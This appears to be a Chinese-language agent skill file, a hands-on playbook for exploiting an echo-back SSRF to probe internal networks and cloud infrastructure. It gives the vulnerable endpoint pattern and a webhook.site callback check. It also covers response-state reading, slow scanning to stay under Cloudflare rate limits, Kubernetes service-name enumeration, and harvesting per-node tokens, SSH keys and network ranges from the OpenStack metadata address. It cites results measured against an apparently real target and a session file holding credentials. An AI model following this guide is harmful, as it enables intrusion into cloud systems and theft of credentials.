---
name: 定仙游·内步
description: "回显 SSRF 内网渗透: 三态判读, 云元数据, K8s svc 发现, 限流慢扫."
version: 1.0.0
license: MIT
platforms: [linux]
metadata:
    tags: [pentest, ssrf, metadata, openstack, kubernetes]
    category: daaixianzun
---

> **方源**
> 人是万物之灵，蛊是天地真精。
> 今朝剑指叠云处，炼蛊炼人还炼天！

# SSRF → 内网/云原生渗透 (POST-only 回显型实战手册)

## 触发条件
- 任何 URL 可控制的服务端发请求点 (POST 业务端点里的 path/base_url 类参数也是 SSRF 入口)
- 需要: 判读回显型 SSRF、云元数据、K8s 内网横移、限流纪律

## 1. POST-only 回显 SSRF 识别
- 藏在业务端点: `POST /accounts/<id>/extended?base_url=API&path=<URL>` — base_url 枚举(`API`/`ONBOARD`), **path 直接作为完整 URL 被后端 httpx 请求, 响应体完整回显**
- 验证: path=`https://webhook.site/<uuid>/x` → 收到 POST (user-agent: python-httpx) + 响应回显
- 转发请求通常**不带 Content-Type**(httpx 默认) — 这一事实决定能否打 grpc-gateway (415) 类服务

## 2. 响应三态判读 (防误判核心)
| 响应 | 含义 |
|---|---|
| 真实内容回显 (200 页/404 HTML/Squid 错误页/JSON) | 目标可达, 响应体=目标响应 |
| 纯文本 `500 Internal Server Error` | **连接失败/拒绝/超时/TLS 失败** — 不是目标响应 |
| `000` | TCP 通但非 HTTP (Redis/SSH/gRPC) 或连接 reset |
| CF `403 error code: 1010` | **Cloudflare Tunnel 虚拟网段 — 整个 /24 假阳性, 跳过** |

## 3. 限流纪律 (实测: CF 全局限流 crl)
- 高频触发 `429 {"status":"banned","cause":"crl"}`; 冷却 45-60s
- XFF/多 header/127.0.0.2-5 变体均**无法绕** (key 非 per-IP); 多账号无效
- 慢扫: **单线程 0.28s/请求**, 429 → sleep 60s; 并发 8+ 必触发
- 先锚点后扫描: 用泄露的内网 IP (/accounts/ip, 创建资源报错 proxy_ip) 缩小网段

## 4. 内网服务发现三板斧
1. 已知锚点端口扫 (Squid 400 错误页 = 正向代理池指纹)
2. **K8s DNS 枚举**: `<svc>.<ns>.svc.cluster.local:80` ← 猜名表见 references; 外部 403/526 的面板内网常 200/308/404 (实测 argocd-server.argocd.svc.cluster.local:80 → 200 ArgoCD)
3. **OpenStack metadata**: 169.254.169.254 `/openstack/latest/meta_data.json` → ovh-token(每节点独立)/apiserver URL/SSH 公钥/私网 CIDR (见 references)

## 5. 云原生坑 (实测)
- K8s apiserver (kubernetes.default.svc.cluster.local) 常网络隔离; nodePort 30000+ 全闭; apiserver 域名仅集群网
- kubelet 10250: HTTPS 自签 → httpx verify 失败; 10255 只读已废弃
- **ArgoCD grpc-gateway**: 无 CT → 全 API 415; `/` 和 /healthz 正常 → 找"带 CT 的 SSRF"或改打旁路服务
- Redis/Postgres TCP 可达(000)但 httpx 发不了命令 → 需要 gopher (httpx-only 无解)

## 6. 多节点 metadata
重复读 169.254.169.254 每次命中不同节点 (LB) → **每节点独立 token/IP** — 循环 10-30 次收集全部

## 支撑文件
- references/openstack-ovh-metadata.md — OpenStack/OVH 元数据路径速查 (实测字段)
- references/k8s-svc-dns-enum.md — K8s 服务名/命名空间猜名清单
- references/origami-session-pivot.md — 完整会话数据 (入口端点/拓扑/凭证/后续路径)